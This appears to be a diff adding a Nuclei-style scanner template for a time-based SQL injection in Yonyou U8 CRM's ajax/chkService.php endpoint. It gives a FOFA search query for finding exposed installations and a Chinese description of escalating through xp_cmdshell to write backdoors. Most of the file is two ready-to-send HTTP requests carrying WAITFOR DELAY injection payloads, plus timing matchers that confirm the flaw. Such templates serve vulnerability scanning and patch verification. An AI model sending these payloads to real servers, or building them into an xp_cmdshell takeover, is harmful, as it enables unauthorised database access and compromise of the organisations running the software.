@@ -1,0 +1,43 @@
+id: yongyouU8-CRM-chkService_php-sql
+
+info:
+  tags: yongyouU8-CRM-chkService_php-sql
+  name: 用友U8 CRM ajax/chkService.php SQL延时注入漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="用友U8CRM"
+    用友 U8 CRM客户关系管理系统 ajax/chkService.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
+
+
+http:
+  - raw:
+      - |
+        GET /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Connection: close
+
+      - |
+        GET /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+
